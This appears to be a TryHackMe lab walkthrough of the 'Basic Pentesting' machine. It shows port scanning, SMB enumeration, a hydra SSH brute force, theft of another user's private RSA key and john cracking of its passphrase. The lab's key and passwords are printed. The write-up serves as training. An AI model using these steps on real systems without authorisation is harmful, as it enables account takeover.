---
layout: single
title: Basic Pentesting - TryHackMe
excerpt: "This is a machine that allows you to practise web app hacking and privilege escalation."
date: 2023-08-24
classes: wide
header:
  teaser: assets/images/thm-writeup-Basic_Pentesting/intro.png
  teaser_home_page: true
  icon: assets/images/tryhackme.png
categories:
  - tryhackme
tags:  
  - Machine
  - John
  - SMB
  - id_rsa
---
![](../assets/images/thm-writeup-Basic_Pentesting/foto21.PNG)

**RECON**

**NMAP**

We performed a scan of all possible open ports on the victim machine.

```css
❯ sudo nmap -p- -sSCV --open --min-rate 5000 -Pn -n -v 10.10.19.38 -oA allPorts

   1   │ # Nmap 7.94 scan initiated Thu Aug 24 21:02:59 2023 as: nmap -p- -sSCV --open --min-rate 5000 -Pn -n -v -oA allPorts 10.10.19.38
   2   │ Nmap scan report for 10.10.19.38
   3   │ Host is up (0.069s latency).
   4   │ Not shown: 65529 closed tcp ports (reset)
   5   │ PORT     STATE SERVICE     VERSION
   6   │ 22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
   7   │ | ssh-hostkey: 
   8   │ |   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
   9   │ |   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
  10   │ |_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
  11   │ 80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
  12   │ |_http-server-header: Apache/2.4.18 (Ubuntu)
  13   │ |_http-title: Site doesn't have a title (text/html).
  14   │ | http-methods: 
  15   │ |_  Supported Methods: OPTIONS GET HEAD POST
  16   │ 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  17   │ 445/tcp  open  0~Gd�U      Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
  18   │ 8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
  19   │ | ajp-methods: 
  20   │ |_  Supported methods: GET HEAD POST OPTIONS
  21   │ 8080/tcp open  http        Apache Tomcat 9.0.7
  22   │ | http-methods: 
  23   │ |_  Supported Methods: GET HEAD POST OPTIONS
  24   │ |_http-favicon: Apache Tomcat
  25   │ |_http-title: Apache Tomcat/9.0.7
  26   │ Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
  27   │ 
  28   │ Host script results:
  29   │ |_clock-skew: mean: 1h19m58s, deviation: 2h18m34s, median: -2s
  30   │ | smb-os-discovery: 
  31   │ |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
  32   │ |   Computer name: basic2
  33   │ |   NetBIOS computer name: BASIC2\x00
  34   │ |   Domain name: \x00
  35   │ |   FQDN: basic2
  36   │ |_  System time: 2023-08-24T15:03:23-04:00
  37   │ | smb-security-mode: 
  38   │ |   account_used: guest
  39   │ |   authentication_level: user
  40   │ |   challenge_response: supported
  41   │ |_  message_signing: disabled (dangerous, but default)
  42   │ | smb2-time: 
  43   │ |   date: 2023-08-24T19:03:23
  44   │ |_  start_date: N/A
  45   │ | nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
  46   │ | Names:
  47   │ |   BASIC2<00>           Flags: <unique><active>
  48   │ |   BASIC2<03>           Flags: <unique><active>
  49   │ |   BASIC2<20>           Flags: <unique><active>
  50   │ |   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
  51   │ |   WORKGROUP<00>        Flags: <group><active>
  52   │ |   WORKGROUP<1d>        Flags: <unique><active>
  53   │ |_  WORKGROUP<1e>        Flags: <group><active>
  54   │ | smb2-security-mode: 
  55   │ |   3:1:1: 
  56   │ |_    Message signing enabled but not required
  57   │ 
  58   │ Read data files from: /usr/bin/../share/nmap
  59   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  60   │ # Nmap done at Thu Aug 24 21:03:27 2023 -- 1 IP address (1 host up) scanned in 27.61 seconds
```

`We have 6 open ports: 22(SSH), 80(HTTP), 139(SMB), 445(SMB), 8009(Jserv), 8080(Tomcat).`

**Enumeration PORT:80**

**WEB**

Accessing the web page we can see that it is under maintenance with a note that says `"Please check back later"`.

![](../assets/images/thm-writeup-Basic_Pentesting/fotoWeb1.PNG)

If we see the source code we have a note that says the following `"Check our dev note section if you need to know what to work on."`.

![](../assets/images/thm-writeup-Basic_Pentesting/fotoWeb2.PNG)


**DIRECTORY LISTING**

We will perform a dictionary attack to list what hidden directories are on the website.
```css
❯ gobuster dir -u http://10.10.19.38/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.19.38/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/development          (Status: 301) [Size: 320] [--> http://10.10.19.38/development/]
Progress: 4238 / 220561 (1.92%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 4318 / 220561 (1.96%)
===============================================================
Finished
===============================================================

```

**/development/**

When we enter the development directory we can see that we have 2 .txt files.
![](../assets/images/thm-writeup-Basic_Pentesting/fotoWeb3.PNG)

**dev.txt File:**

It appears to be a conversation between two potential users.

User -> J

User -> K
![](../assets/images/thm-writeup-Basic_Pentesting/fotoWeb4.PNG)

**j.txt File:**

With this conversation we can understand that user "J" has a weak password that can be easily cracked.

![](../assets/images/thm-writeup-Basic_Pentesting/fotoWeb5.PNG)

**Enumeration PORT:139,445**

We can observe that there is a shared folder named `'Anonymous'` when using `smbclient`.

```css
❯ smbclient -L 10.10.19.38
Password for [WORKGROUP\anonimo]:

        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BASIC2

```
  
If we connect to the shared folder, we can see that there is a .txt file named staff.txt.

![](../assets/images/thm-writeup-Basic_Pentesting/smb.PNG)

If we open the file, we can see that it's a message from Kay to Jan, and with this, we discover the full names of K and J.

```css
❯ cat staff.txt
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: staff.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Announcement to staff:
   2   │ 
   3   │ PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
   4   │ this is how mistakes happen. (This means you too, Jan!)
   5   │ 
   6   │ -Kay
```

**PASSWORD CRACKING**

If we recall the note from the beginning, Kay told Jan to change the password as soon as possible, as it was very weak. Knowing this, we could potentially crack the password using brute force.

```css
❯ hydra -l jan -P /home/anonimo/rockyou.txt ssh://10.10.19.38
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-24 23:15:34
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.19.38:22/
[STATUS] 176.00 tries/min, 176 tries in 00:01h, 14344222 to do in 1358:22h, 16 active
[STATUS] 118.33 tries/min, 355 tries in 00:03h, 14344043 to do in 2020:18h, 16 active
[22][ssh] host: 10.10.19.38   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-08-24 23:22:22

```
We have Jan's password, which will give us SSH access.

`User: jan
Password: armando`

```bash
jan@basic2:~$ id
uid=1001(jan) gid=1001(jan) groups=1001(jan)
```
**PRIVILEGE ESCALATION**

After a bit of searching, we realize that the user 'kay' has a file that seems to contain a password. Unfortunately, we cannot access it due to lack of permissions.

```bash
jan@basic2:~$ cd /home
jan@basic2:/home$ ls
jan  kay
jan@basic2:/home$ cd kay/
jan@basic2:/home/kay$ ls
pass.bak
jan@basic2:/home/kay$ cat pass.bak 
cat: pass.bak: Permission denied
jan@basic2:/home/kay$ 
```

If we list the hidden directories, we can see that we have permission to view the contents of the /.ssh directory, allowing us to see the id_rsa file and access 'kay' via SSH.

```bash
jan@basic2:/home/kay$ ls -la
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
jan@basic2:/home/kay$ cd .ssh/
jan@basic2:/home/kay/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
```
Now we will proceed to copy the private key to another terminal in order to initiate an SSH connection to Kay

```bash
jan@basic2:/home/kay/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75

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
-----END RSA PRIVATE KEY-----
```
And we will give you permissions.

`❯ chmod 600 id_rsa`

When attempting to establish an SSH session with the id_rsa, it will prompt us for a passphrase that we don't have. To obtain the passphrase, we will try brute force methods.

```bash
❯ ssh kay@10.10.19.38 -i id_rsa
Enter passphrase for key 'id_rsa': 
```

The first step to perform brute force is to convert the id_rsa into john format.

```bash
❯ ssh2john id_rsa > id_john.txt
```

The next step is to use the John tool along with the rockyou wordlist to attempt to crack the passphrase of the id_rsa, and as we can see, it works.

```bash
❯ john id_john.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rsa)     
1g 0:00:00:00 DONE (2023-08-25 00:14) 5.263g/s 435536p/s 435536c/s 435536C/s bettyboop123..bambino1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
`passphrase -> beeswax`

Now we can access Kay and view the content of the file.

```bash
❯ ssh kay@10.10.19.38 -i id_rsa
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Thu Aug 24 18:19:07 2023 from 10.8.161.134
kay@basic2:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```
